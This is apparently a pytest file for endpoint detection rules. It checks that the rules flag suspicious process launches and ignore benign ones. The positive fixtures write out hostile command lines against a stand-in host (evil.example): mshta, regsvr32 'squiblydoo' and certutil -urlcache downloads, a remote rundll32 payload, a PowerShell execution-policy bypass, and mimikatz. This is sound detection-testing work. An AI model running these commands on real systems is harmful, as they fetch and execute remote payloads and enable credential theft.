from aire_detection.models import EventType
from aire_detection.rules import endpoint as ep


def test_endpoint001_positive(event_factory):
    rule = ep.SuspiciousProcessCreationRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="mimikatz.exe", host="h1")
    assert rule.match(e) is not None


def test_endpoint001_negative(event_factory):
    rule = ep.SuspiciousProcessCreationRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="notepad.exe", host="h1")
    assert rule.match(e) is None


def test_endpoint002_positive_bypass_flag(event_factory):
    rule = ep.SuspiciousPowerShellExecutionRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe",
                       command_line="powershell.exe -ExecutionPolicy Bypass -File x.ps1")
    assert rule.match(e) is not None


def test_endpoint002_negative_plain_powershell(event_factory):
    rule = ep.SuspiciousPowerShellExecutionRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe",
                       command_line="powershell.exe -File report.ps1")
    assert rule.match(e) is None


def test_endpoint003_positive_office_parent(event_factory):
    rule = ep.SuspiciousPowerShellParentChildRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe",
                       parent_process_name="winword.exe")
    assert rule.match(e) is not None


def test_endpoint003_negative_explorer_parent(event_factory):
    rule = ep.SuspiciousPowerShellParentChildRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe",
                       parent_process_name="explorer.exe")
    assert rule.match(e) is None


def test_endpoint004_positive_remote_hta(event_factory):
    rule = ep.SuspiciousWindowsInterpreterExecutionRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="mshta.exe",
                       command_line="mshta.exe http://evil.example/a.hta")
    assert rule.match(e) is not None


def test_endpoint004_negative_local_script(event_factory):
    rule = ep.SuspiciousWindowsInterpreterExecutionRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="cscript.exe",
                       command_line="cscript.exe C:\\scripts\\local.vbs")
    assert rule.match(e) is None


def test_endpoint005_positive_temp_dir(event_factory):
    rule = ep.SuspiciousProcessFromTempRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="update.exe",
                       raw={"image_path": r"C:\Users\bob\AppData\Local\Temp\update.exe"})
    assert rule.match(e) is not None


def test_endpoint005_negative_program_files(event_factory):
    rule = ep.SuspiciousProcessFromTempRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="app.exe",
                       raw={"image_path": r"C:\Program Files\App\app.exe"})
    assert rule.match(e) is None


def test_endpoint006_positive_office_child(event_factory):
    rule = ep.SuspiciousOfficeChildProcessRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="cmd.exe", parent_process_name="excel.exe")
    assert rule.match(e) is not None


def test_endpoint006_negative_normal_child(event_factory):
    rule = ep.SuspiciousOfficeChildProcessRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="splwow64.exe", parent_process_name="excel.exe")
    assert rule.match(e) is None


def test_endpoint007_positive_remote_dll(event_factory):
    rule = ep.SuspiciousRundll32Rule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="rundll32.exe",
                       command_line=r"rundll32.exe \\10.0.0.5\share\payload.dll,Entry")
    assert rule.match(e) is not None


def test_endpoint007_negative_control_panel_applet(event_factory):
    rule = ep.SuspiciousRundll32Rule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="rundll32.exe",
                       command_line=r"rundll32.exe shell32.dll,Control_RunDLL")
    assert rule.match(e) is None


def test_endpoint008_positive_squiblydoo(event_factory):
    rule = ep.SuspiciousRegsvr32Rule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="regsvr32.exe",
                       command_line="regsvr32.exe /s /n /u /i:http://evil.example/a.sct scrobj.dll")
    assert rule.match(e) is not None


def test_endpoint008_negative_local_dll_registration(event_factory):
    rule = ep.SuspiciousRegsvr32Rule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="regsvr32.exe",
                       command_line=r"regsvr32.exe C:\app\component.dll")
    assert rule.match(e) is None


def test_endpoint009_positive_remote_hta_payload(event_factory):
    rule = ep.SuspiciousMshtaRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="mshta.exe",
                       command_line="mshta.exe https://evil.example/payload.hta")
    assert rule.match(e) is not None


def test_endpoint009_negative_no_ref(event_factory):
    rule = ep.SuspiciousMshtaRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="mshta.exe", command_line="mshta.exe")
    assert rule.match(e) is None


def test_endpoint010_positive_urlcache(event_factory):
    rule = ep.SuspiciousCertutilRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="certutil.exe",
                       command_line="certutil.exe -urlcache -split -f http://evil.example/p.exe p.exe")
    assert rule.match(e) is not None


def test_endpoint010_negative_normal_cert_op(event_factory):
    rule = ep.SuspiciousCertutilRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="certutil.exe",
                       command_line="certutil.exe -verify cert.cer")
    assert rule.match(e) is None


def test_endpoint_rules_ignore_non_process_events(event_factory):
    for rule in ep.get_rules():
        e = event_factory(EventType.NETWORK_CONNECTION)
        assert rule.match(e) is None
